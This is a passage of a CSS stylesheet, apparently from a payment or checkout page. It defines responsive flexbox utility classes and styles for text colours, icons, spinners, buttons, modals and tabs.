            }

            .align-items-baseline-sm {
                -webkit-box-align: baseline;
                -webkit-align-items: baseline;
                -ms-flex-align: baseline;
                align-items: baseline;
            }

            .wrap-wrap-sm {
                -webkit-flex-wrap: wrap;
                -ms-flex-wrap: wrap;
                flex-wrap: wrap;
            }

            .wrap-nowrap-sm {
                -webkit-flex-wrap: nowrap;
                -ms-flex-wrap: nowrap;
                flex-wrap: nowrap;
            }

            .width-auto-sm {
                width: auto;
            }

            .width-auto-sm,
            .width-fixed-sm {
                -webkit-flex-basis: auto;
                -ms-flex-preferred-size: auto;
                flex-basis: auto;
            }

            .width-fixed-sm {
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
            }

            .width-grow-sm {
                -webkit-flex-basis: 0;
                -ms-flex-preferred-size: 0;
                flex-basis: 0;
                -webkit-box-flex: 1;
                -webkit-flex-grow: 1;
                -ms-flex-positive: 1;
                flex-grow: 1;
            }

            .width-1-sm {
                width: 8.33333333%;
            }

            .width-2-sm {
                width: 16.66666667%;
            }

            .width-3-sm {
                width: 25%;
            }

            .width-4-sm {
                width: 33.33333333%;
            }

            .width-5-sm {
                width: 41.66666667%;
            }

            .width-6-sm {
                width: 50%;
            }

            .width-7-sm {
                width: 58.33333333%;
            }

            .width-8-sm {
                width: 66.66666667%;
            }

            .width-9-sm {
                width: 75%;
            }

            .width-10-sm {
                width: 83.33333333%;
            }

            .width-11-sm {
                width: 91.66666667%;
            }

            .width-12-sm {
                width: 100%;
            }
        }

        @media only screen and (min-width: 768px) {
            .direction-row-md {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
            }

            .direction-row-reverse-md {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: row-reverse;
                -ms-flex-direction: row-reverse;
                flex-direction: row-reverse;
            }

            .direction-column-md {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
            }

            .direction-column-reverse-md {
                -webkit-box-orient: vertical;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: column-reverse;
                -ms-flex-direction: column-reverse;
                flex-direction: column-reverse;
            }

            .spacing-0-md {
                margin: 0;
            }

            .spacing-0-md > .flex-item {
                padding: 0;
            }

            .spacing-4-md {
                margin: -2px;
            }

            .spacing-4-md > .flex-item {
                padding: 2px;
            }

            .spacing-8-md {
                margin: -4px;
            }

            .spacing-8-md > .flex-item {
                padding: 4px;
            }

            .spacing-12-md {
                margin: -6px;
            }

            .spacing-12-md > .flex-item {
                padding: 6px;
            }

            .spacing-16-md {
                margin: -8px;
            }

            .spacing-16-md > .flex-item {
                padding: 8px;
            }

            .spacing-24-md {
                margin: -12px;
            }

            .spacing-24-md > .flex-item {
                padding: 12px;
            }

            .spacing-32-md {
                margin: -16px;
            }

            .spacing-32-md > .flex-item {
                padding: 16px;
            }

            .justify-content-flex-start-md {
                -webkit-box-pack: start;
                -webkit-justify-content: flex-start;
                -ms-flex-pack: start;
                justify-content: flex-start;
            }

            .justify-content-flex-end-md {
                -webkit-box-pack: end;
                -webkit-justify-content: flex-end;
                -ms-flex-pack: end;
                justify-content: flex-end;
            }

            .justify-content-center-md {
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }

            .justify-content-space-between-md {
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                -ms-flex-pack: justify;
                justify-content: space-between;
            }

            .justify-content-space-around-md {
                -webkit-justify-content: space-around;
                -ms-flex-pack: distribute;
                justify-content: space-around;
            }

            .justify-content-space-evenly-md {
                -webkit-box-pack: space-evenly;
                -webkit-justify-content: space-evenly;
                -ms-flex-pack: space-evenly;
                justify-content: space-evenly;
            }

            .align-items-flex-start-md {
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
            }

            .align-items-flex-end-md {
                -webkit-box-align: end;
                -webkit-align-items: flex-end;
                -ms-flex-align: end;
                align-items: flex-end;
            }

            .align-items-center-md {
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
            }

            .align-items-stretch-md {
                -webkit-box-align: stretch;
                -webkit-align-items: stretch;
                -ms-flex-align: stretch;
                align-items: stretch;
            }

            .align-items-baseline-md {
                -webkit-box-align: baseline;
                -webkit-align-items: baseline;
                -ms-flex-align: baseline;
                align-items: baseline;
            }

            .wrap-wrap-md {
                -webkit-flex-wrap: wrap;
                -ms-flex-wrap: wrap;
                flex-wrap: wrap;
            }

            .wrap-nowrap-md {
                -webkit-flex-wrap: nowrap;
                -ms-flex-wrap: nowrap;
                flex-wrap: nowrap;
            }

            .width-auto-md {
                width: auto;
            }

            .width-auto-md,
            .width-fixed-md {
                -webkit-flex-basis: auto;
                -ms-flex-preferred-size: auto;
                flex-basis: auto;
            }

            .width-fixed-md {
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
            }

            .width-grow-md {
                -webkit-flex-basis: 0;
                -ms-flex-preferred-size: 0;
                flex-basis: 0;
                -webkit-box-flex: 1;
                -webkit-flex-grow: 1;
                -ms-flex-positive: 1;
                flex-grow: 1;
            }

            .width-1-md {
                width: 8.33333333%;
            }

            .width-2-md {
                width: 16.66666667%;
            }

            .width-3-md {
                width: 25%;
            }

            .width-4-md {
                width: 33.33333333%;
            }

            .width-5-md {
                width: 41.66666667%;
            }

            .width-6-md {
                width: 50%;
            }

            .width-7-md {
                width: 58.33333333%;
            }

            .width-8-md {
                width: 66.66666667%;
            }

            .width-9-md {
                width: 75%;
            }

            .width-10-md {
                width: 83.33333333%;
            }

            .width-11-md {
                width: 91.66666667%;
            }

            .width-12-md {
                width: 100%;
            }
        }

        @media only screen and (min-width: 992px) {
            .direction-row-lg {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
            }

            .direction-row-reverse-lg {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: row-reverse;
                -ms-flex-direction: row-reverse;
                flex-direction: row-reverse;
            }

            .direction-column-lg {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
            }

            .direction-column-reverse-lg {
                -webkit-box-orient: vertical;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: column-reverse;
                -ms-flex-direction: column-reverse;
                flex-direction: column-reverse;
            }

            .spacing-0-lg {
                margin: 0;
            }

            .spacing-0-lg > .flex-item {
                padding: 0;
            }

            .spacing-4-lg {
                margin: -2px;
            }

            .spacing-4-lg > .flex-item {
                padding: 2px;
            }

            .spacing-8-lg {
                margin: -4px;
            }

            .spacing-8-lg > .flex-item {
                padding: 4px;
            }

            .spacing-12-lg {
                margin: -6px;
            }

            .spacing-12-lg > .flex-item {
                padding: 6px;
            }

            .spacing-16-lg {
                margin: -8px;
            }

            .spacing-16-lg > .flex-item {
                padding: 8px;
            }

            .spacing-24-lg {
                margin: -12px;
            }

            .spacing-24-lg > .flex-item {
                padding: 12px;
            }

            .spacing-32-lg {
                margin: -16px;
            }

            .spacing-32-lg > .flex-item {
                padding: 16px;
            }

            .justify-content-flex-start-lg {
                -webkit-box-pack: start;
                -webkit-justify-content: flex-start;
                -ms-flex-pack: start;
                justify-content: flex-start;
            }

            .justify-content-flex-end-lg {
                -webkit-box-pack: end;
                -webkit-justify-content: flex-end;
                -ms-flex-pack: end;
                justify-content: flex-end;
            }

            .justify-content-center-lg {
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }

            .justify-content-space-between-lg {
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                -ms-flex-pack: justify;
                justify-content: space-between;
            }

            .justify-content-space-around-lg {
                -webkit-justify-content: space-around;
                -ms-flex-pack: distribute;
                justify-content: space-around;
            }

            .justify-content-space-evenly-lg {
                -webkit-box-pack: space-evenly;
                -webkit-justify-content: space-evenly;
                -ms-flex-pack: space-evenly;
                justify-content: space-evenly;
            }

            .align-items-flex-start-lg {
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
            }

            .align-items-flex-end-lg {
                -webkit-box-align: end;
                -webkit-align-items: flex-end;
                -ms-flex-align: end;
                align-items: flex-end;
            }

            .align-items-center-lg {
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
            }

            .align-items-stretch-lg {
                -webkit-box-align: stretch;
                -webkit-align-items: stretch;
                -ms-flex-align: stretch;
                align-items: stretch;
            }

            .align-items-baseline-lg {
                -webkit-box-align: baseline;
                -webkit-align-items: baseline;
                -ms-flex-align: baseline;
                align-items: baseline;
            }

            .wrap-wrap-lg {
                -webkit-flex-wrap: wrap;
                -ms-flex-wrap: wrap;
                flex-wrap: wrap;
            }

            .wrap-nowrap-lg {
                -webkit-flex-wrap: nowrap;
                -ms-flex-wrap: nowrap;
                flex-wrap: nowrap;
            }

            .width-auto-lg {
                width: auto;
            }

            .width-auto-lg,
            .width-fixed-lg {
                -webkit-flex-basis: auto;
                -ms-flex-preferred-size: auto;
                flex-basis: auto;
            }

            .width-fixed-lg {
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
            }

            .width-grow-lg {
                -webkit-flex-basis: 0;
                -ms-flex-preferred-size: 0;
                flex-basis: 0;
                -webkit-box-flex: 1;
                -webkit-flex-grow: 1;
                -ms-flex-positive: 1;
                flex-grow: 1;
            }

            .width-1-lg {
                width: 8.33333333%;
            }

            .width-2-lg {
                width: 16.66666667%;
            }

            .width-3-lg {
                width: 25%;
            }

            .width-4-lg {
                width: 33.33333333%;
            }

            .width-5-lg {
                width: 41.66666667%;
            }

            .width-6-lg {
                width: 50%;
            }

            .width-7-lg {
                width: 58.33333333%;
            }

            .width-8-lg {
                width: 66.66666667%;
            }

            .width-9-lg {
                width: 75%;
            }

            .width-10-lg {
                width: 83.33333333%;
            }

            .width-11-lg {
                width: 91.66666667%;
            }

            .width-12-lg {
                width: 100%;
            }
        }

        .Icon--xs {
            height: 8px;
        }

        .Icon--xs.Icon--square {
            width: 8px;
        }

        .Icon--sm {
            height: 12px;
        }

        .Icon--sm.Icon--square {
            width: 12px;
        }

        .Icon--md {
            height: 16px;
        }

        .Icon--md.Icon--square {
            width: 16px;
        }

        .Icon--lg {
            height: 24px;
        }

        .Icon--lg.Icon--square {
            width: 24px;
        }

        .Icon--gray300 {
            fill: rgba(26, 26, 26, 0.4);
        }

        .Icon--gray400 {
            fill: rgba(26, 26, 26, 0.5);
        }

        .Icon--white {
            fill: #fff;
        }

        .Icon--red {
            color: #dc2727;
            fill: #dc2727;
        }

        .Icon--blue {
            color: #0074d4;
            fill: #0074d4;
        }

        .Icon .Icon-fill {
            fill: #565656;
        }

        .Text {
            margin: 0;
        }

        .Text-fontSize--11 {
            font-size: 11px;
        }

        .Text-fontSize--12 {
            font-size: 12px;
        }

        .Text-fontSize--13 {
            font-size: 13px;
        }

        .Text-fontSize--14 {
            font-size: 14px;
        }

        .Text-fontSize--16 {
            font-size: 16px;
        }

        .Text-fontSize--20 {
            font-size: 20px;
        }

        .Text-fontSize--24 {
            font-size: 24px;
        }

        .Text-fontSize--36 {
            font-size: 36px;
        }

        .Text-fontWeight--400 {
            font-weight: 400;
        }

        .Text-fontWeight--500 {
            font-weight: 500;
        }

        .Text-fontWeight--600 {
            font-weight: 600;
        }

        .Text-fontWeight--700 {
            font-weight: 700;
        }

        .Text-fontWeight--900 {
            font-weight: 900;
        }

        .Text-fontStyle--italic {
            font-style: italic;
        }

        .Text-fontStyle--normal {
            font-style: normal;
        }

        .Text-color--white {
            color: #fff;
        }

        .Text-color--gray50 {
            color: rgba(26, 26, 26, 0.1);
        }

        .Text-color--gray100 {
            color: rgba(26, 26, 26, 0.2);
        }

        .Text-color--gray200 {
            color: rgba(26, 26, 26, 0.3);
        }

        .Text-color--gray300 {
            color: rgba(26, 26, 26, 0.4);
        }

        .Text-color--gray400 {
            color: rgba(26, 26, 26, 0.5);
        }

        .Text-color--gray500 {
            color: rgba(26, 26, 26, 0.6);
        }

        .Text-color--gray600 {
            color: rgba(26, 26, 26, 0.7);
        }

        .Text-color--gray700 {
            color: rgba(26, 26, 26, 0.8);
        }

        .Text-color--gray800 {
            color: rgba(26, 26, 26, 0.9);
        }

        .Text-color--gray900 {
            color: #1a1a1a;
        }

        .Text-color--lightGray50 {
            color: hsla(0, 0%, 100%, 0.1);
        }

        .Text-color--lightGray100 {
            color: hsla(0, 0%, 100%, 0.2);
        }

        .Text-color--lightGray200 {
            color: hsla(0, 0%, 100%, 0.3);
        }

        .Text-color--lightGray300 {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .Text-color--lightGray400 {
            color: hsla(0, 0%, 100%, 0.5);
        }

        .Text-color--lightGray500 {
            color: hsla(0, 0%, 100%, 0.6);
        }

        .Text-color--lightGray600 {
            color: hsla(0, 0%, 100%, 0.7);
        }

        .Text-color--lightGray700 {
            color: hsla(0, 0%, 100%, 0.8);
        }

        .Text-color--lightGray800 {
            color: hsla(0, 0%, 100%, 0.9);
        }

        .Text-color--lightGray900 {
            color: #fff;
        }

        .is-fontFamily--Inconsolata .FormFieldGroup-labelContainer .Text,
        .is-fontFamily--PTSans .FormFieldGroup-labelContainer .Text,
        .is-fontFamily--TitilliumWeb .FormFieldGroup-labelContainer .Text {
            font-size: 14px;
        }

        .is-fontFamily--Lora .Text {
            letter-spacing: 0.15pt;
        }

        .is-fontFamily--Montserrat .Text {
            letter-spacing: -0.1pt;
        }

        .App-Overview.is-darkBackground .Text-color--default,
        .is-darkMode .App-Payment .Text-color--default,
        .is-darkMode .OrderDetailsDropdown .Text-color--default {
            color: #fff;
        }

        .App-Overview.is-darkBackground .Text-color--gray50,
        .is-darkMode .App-Payment .Text-color--gray50,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray50 {
            color: hsla(0, 0%, 100%, 0.1);
        }

        .App-Overview.is-darkBackground .Text-color--gray100,
        .is-darkMode .App-Payment .Text-color--gray100,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray100 {
            color: hsla(0, 0%, 100%, 0.2);
        }

        .App-Overview.is-darkBackground .Text-color--gray200,
        .is-darkMode .App-Payment .Text-color--gray200,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray200 {
            color: hsla(0, 0%, 100%, 0.3);
        }

        .App-Overview.is-darkBackground .Text-color--gray300,
        .is-darkMode .App-Payment .Text-color--gray300,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray300 {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .App-Overview.is-darkBackground .Text-color--gray400,
        .is-darkMode .App-Payment .Text-color--gray400,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray400 {
            color: hsla(0, 0%, 100%, 0.5);
        }

        .App-Overview.is-darkBackground .Text-color--gray500,
        .is-darkMode .App-Payment .Text-color--gray500,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray500 {
            color: hsla(0, 0%, 100%, 0.6);
        }

        .App-Overview.is-darkBackground .Text-color--gray600,
        .is-darkMode .App-Payment .Text-color--gray600,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray600 {
            color: hsla(0, 0%, 100%, 0.7);
        }

        .App-Overview.is-darkBackground .Text-color--gray700,
        .is-darkMode .App-Payment .Text-color--gray700,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray700 {
            color: hsla(0, 0%, 100%, 0.8);
        }

        .App-Overview.is-darkBackground .Text-color--gray800,
        .is-darkMode .App-Payment .Text-color--gray800,
        .is-darkMode .OrderDetailsDropdown .Text-color--gray800 {
            color: hsla(0, 0%, 100%, 0.9);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--default,
        .App-Overview.is-darkBackground .Text-color--gray900,
        .is-darkMode .App-Payment .Text-color--gray900 {
            color: #fff;
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray50 {
            color: hsla(0, 0%, 100%, 0.1);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray100 {
            color: hsla(0, 0%, 100%, 0.2);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray200 {
            color: hsla(0, 0%, 100%, 0.3);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray300 {
            color: hsla(0, 0%, 100%, 0.4);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray400 {
            color: hsla(0, 0%, 100%, 0.5);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray500 {
            color: hsla(0, 0%, 100%, 0.6);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray600 {
            color: hsla(0, 0%, 100%, 0.7);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray700 {
            color: hsla(0, 0%, 100%, 0.8);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray800 {
            color: hsla(0, 0%, 100%, 0.9);
        }

        .App-Footer.is-darkBackground.is-mobilePaymentMenu .Text-color--gray900 {
            color: #fff;
        }

        @media only screen and (min-width: 992px) {
            .App-Footer.is-darkBackground .Text-color--default {
                color: #fff;
            }

            .App-Footer.is-darkBackground .Text-color--gray50 {
                color: hsla(0, 0%, 100%, 0.1);
            }

            .App-Footer.is-darkBackground .Text-color--gray100 {
                color: hsla(0, 0%, 100%, 0.2);
            }

            .App-Footer.is-darkBackground .Text-color--gray200 {
                color: hsla(0, 0%, 100%, 0.3);
            }

            .App-Footer.is-darkBackground .Text-color--gray300 {
                color: hsla(0, 0%, 100%, 0.4);
            }

            .App-Footer.is-darkBackground .Text-color--gray400 {
                color: hsla(0, 0%, 100%, 0.5);
            }

            .App-Footer.is-darkBackground .Text-color--gray500 {
                color: hsla(0, 0%, 100%, 0.6);
            }

            .App-Footer.is-darkBackground .Text-color--gray600 {
                color: hsla(0, 0%, 100%, 0.7);
            }

            .App-Footer.is-darkBackground .Text-color--gray700 {
                color: hsla(0, 0%, 100%, 0.8);
            }

            .App-Footer.is-darkBackground .Text-color--gray800 {
                color: hsla(0, 0%, 100%, 0.9);
            }

            .App-Footer.is-darkBackground .Text-color--gray900 {
                color: #fff;
            }
        }

        .Text-color--blue {
            color: #0074d4;
        }

        .Text-color--red {
            color: #dc2727;
        }

        .Text-color--green {
            color: #24b47e;
        }

        .Text-color--yellow {
            color: #ffde92;
        }

        .Text-color--orange {
            color: #bb5504;
        }

        .Text-transform--uppercase {
            text-transform: uppercase;
        }

        .Text--tabularNumbers {
            font-variant-numeric: tabular-nums;
            letter-spacing: -0.03rem;
        }

        .Text--truncate {
            text-overflow: ellipsis;
            overflow: hidden;
            white-space: nowrap;
        }

        .CustomPolicyMessage {
            padding: 12px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 8px;
            overflow: hidden;
        }

        .CustomPolicyMessage-icon {
            height: 16px;
            min-width: 24px;
            padding-top: 4px;
            padding-right: 10px;
            color: rgba(0, 0, 0, 0.5);
        }

        .Policy-icon {
            min-width: 16px;
            margin-top: 2px;
            color: rgba(26, 26, 26, 0.9);
            fill: rgba(26, 26, 26, 0.9);
        }

        .Policy-text {
            margin-left: 12px;
            width: 100%;
        }

        .Policy-content {
            margin-top: 4px;
        }

        .Spinner {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .Spinner,
        .Spinner-svg {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
        }

        .Spinner-svg {
            position: relative;
        }

        .Spinner--sm .Spinner-svg {
            width: 12px;
            height: 12px;
        }

        .Spinner--md .Spinner-svg {
            width: 18px;
            height: 18px;
        }

        .Spinner--lg .Spinner-svg {
            width: 48px;
            height: 48px;
        }

        .Spinner-ellipse {
            fill: transparent;
            stroke: rgba(26, 26, 26, 0.3);
            stroke-width: 1.5;
            stroke-linecap: round;
            stroke-dasharray: 60;
            stroke-dashoffset: 20;
            -webkit-animation: SpinnerAnimationShow 0.25s ease normal, SpinnerAnimationRotation 0.6s linear infinite;
            animation: SpinnerAnimationShow 0.25s ease normal, SpinnerAnimationRotation 0.6s linear infinite;
            transition-property: opacity, -webkit-transform;
            transition-property: opacity, transform;
            transition-property: opacity, transform, -webkit-transform;
            transition-timing-function: ease;
            -webkit-transform-origin: 50% 50%;
            -ms-transform-origin: 50% 50%;
            transform-origin: 50% 50%;
        }

        .Spinner--white .Spinner-ellipse {
            stroke: #fff;
        }

        @-webkit-keyframes SpinnerAnimationShow {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes SpinnerAnimationShow {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @-webkit-keyframes SpinnerAnimationRotation {
            0% {
                -webkit-transform: scaleX(-1) rotate(0);
                transform: scaleX(-1) rotate(0);
            }
            50% {
                -webkit-transform: scaleX(-1) rotate(-180deg);
                transform: scaleX(-1) rotate(-180deg);
            }
            to {
                -webkit-transform: scaleX(-1) rotate(-1turn);
                transform: scaleX(-1) rotate(-1turn);
            }
        }

        @keyframes SpinnerAnimationRotation {
            0% {
                -webkit-transform: scaleX(-1) rotate(0);
                transform: scaleX(-1) rotate(0);
            }
            50% {
                -webkit-transform: scaleX(-1) rotate(-180deg);
                transform: scaleX(-1) rotate(-180deg);
            }
            to {
                -webkit-transform: scaleX(-1) rotate(-1turn);
                transform: scaleX(-1) rotate(-1turn);
            }
        }

        .Button {
            border: 1px solid transparent;
            border-radius: 6px;
            transition: background-color 0.1s ease-in, -webkit-transform 0.08s ease-in;
            transition: background-color 0.1s ease-in, transform 0.08s ease-in;
            transition: background-color 0.1s ease-in, transform 0.08s ease-in, -webkit-transform 0.08s ease-in;
            cursor: pointer;
        }

        .App-Container.is-squareBordered .Button,
        .ModalContent--is-squareBordered .Button {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Button,
        .ModalContent--is-veryRoundBordered .Button {
            border-radius: 22px;
        }

        .Button--xs {
            font-size: 10px;
        }

        .Button--sm {
            font-size: 12px;
        }

        .Button--md {
            font-size: 14px;
            padding: 8px 16px;
        }

        .Button--lg {
            font-size: 16px;
            padding: 12px 24px;
        }

        .Button--xlg {
            font-size: 20px;
            padding: 12px 40px;
        }

        .Button--primary {
            color: #fff;
            background-color: #0074d4;
            border-color: #0074d4;
        }

        .Button--primary:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .Button--primary:not(:disabled):hover {
            background-color: #0066ba;
        }

        .Button--primary:active {
            -webkit-transform: scale(0.98);
            -ms-transform: scale(0.98);
            transform: scale(0.98);
        }

        .Button--primary:disabled {
            background-color: rgba(0, 102, 186, 0.78);
        }

        .Button--primary:disabled:hover {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
            cursor: default;
        }

        .Button--secondary {
            color: #1a1a1a;
            background-color: rgba(0, 0, 0, 0.03);
        }

        .Button--secondary:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .Button--secondary:not(:disabled):hover {
            background-color: rgba(26, 26, 26, 0.05);
        }

        .Button--secondary:active {
            background-color: rgba(0, 0, 0, 0.075);
            -webkit-transform: scale(0.98);
            -ms-transform: scale(0.98);
            transform: scale(0.98);
        }

        .Button--secondary:disabled {
            background-color: rgba(0, 0, 0, 0.01);
        }

        .Button--secondary:disabled:hover {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
            cursor: default;
        }

        .Button--link {
            padding: 0;
            color: #0074d4;
            background-color: transparent;
            border: none;
            outline: none;
            border-radius: 0;
            text-decoration-skip-ink: none;
            -webkit-tap-highlight-color: transparent;
        }

        .App--keyboardInteractionMode .Button--link:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .Button--menuitem {
            color: rgba(26, 26, 26, 0.5);
            padding-left: 12px;
            padding-right: 12px;
            width: 100%;
            background-color: transparent;
            outline: none;
            border: none;
            display: block;
            border-radius: 0;
        }

        .Button--menuitem .Icon {
            fill: rgba(26, 26, 26, 0.5);
        }

        .Button--menuitem:hover {
            background-color: rgba(26, 26, 26, 0.05);
            color: #1a1a1a;
        }

        .Button--menuitem:hover .Icon {
            fill: #1a1a1a;
        }

        .Button-Icon {
            margin-right: 8px;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
        }

        .Button-Icon--right {
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1;
            margin-right: 0;
            margin-left: 8px;
        }

        .Button-Spinner {
            opacity: 0.5;
        }

        .Body--modal-open {
            overflow: hidden;
        }

        .ModalOverlay {
            z-index: 14;
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            opacity: 0;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            transition: all 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            -webkit-tap-highlight-color: transparent;
        }

        .ModalOverlay:before {
            content: "";
            position: absolute;
            top: 0;
            right: 0;
            left: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.2);
            -webkit-filter: blur(20px);
            filter: blur(20px);
        }

        .ModalOverlay--afterOpen {
            opacity: 1;
        }

        .ModalOverlay--beforeClose {
            opacity: 0;
        }

        .ModalContent {
            z-index: 15;
            overflow: auto;
            outline: none;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .ModalContent--is-squareBordered,
        .ModalContent--is-squareBordered .CustomPolicyMessage {
            border-radius: 0;
        }

        .ModalContent--is-veryRoundBordered,
        .ModalContent--is-veryRoundBordered .CustomPolicyMessage {
            border-radius: 18px;
        }

        .ModalContent--afterOpen {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .ModalContent--beforeClose {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
        }

        .Tabs-Container {
            position: relative;
        }

        .Tabs-TabPanelContainer > :nth-last-child(2):first-child {
            position: absolute;
        }

        .Tabs-TabList {
            list-style: none;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            padding: 0;
            margin: 0;
            position: relative;
        }

        .Tabs-PrintableTabPanelContainer {
            display: none;
        }

        @media print {
            .Tabs.is-printable .Tabs-TabPanelContainer {
                display: none;
            }

            .Tabs.is-printable .Tabs-PrintableTabPanelContainer {
                display: block;
            }

            role[tabpanel] {
                -webkit-column-break-inside: avoid;
                page-break-inside: avoid;
                break-inside: avoid;
            }
        }

        .Tabs.is-icontabs .Tabs-TabList {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .Tabs.is-contenttabs .Tabs-TabList {
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            box-shadow: inset 0 -1px #e3e8ee;
        }

        .Tabs-TabListOverflowContainer {
            list-style: none;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            padding: 0;
            margin: 0;
            position: relative;
        }

        .Tabs-TabListItemContainer--overflow-button svg {
            width: 16px;
        }

        .Tabs-TabListItemContainer--overflow-button .Tabs-TabListItem--overflow-toggle {
            display: block;
        }

        .Tabs-TabListItem--overflow-toggle .Tabs-TabListItemContent {
            height: 100%;
        }

        .Tabs-TabListItem--overflow-toggle .Icon {
            margin-top: 2px;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer {
            display: none;
            padding: 6px 0;
            border-radius: 6px;
            box-shadow: 0 0 0 1px hsla(0, 0%, 68.6%, 0.2), 0 15px 35px 0 rgba(49, 49, 93, 0.08), 0 5px 15px 0 rgba(0, 0, 0, 0.06);
            background-color: #fff;
        }

        .App-Container.is-squareBordered .Tabs.is-desktop .Tabs-TabListOverflowContainer {
            border-radius: 0;
        }

        .App-Container.App-Container.is-veryRoundBordered .Tabs.is-desktop .Tabs-TabListOverflowContainer {
            border-radius: 18px;
        }

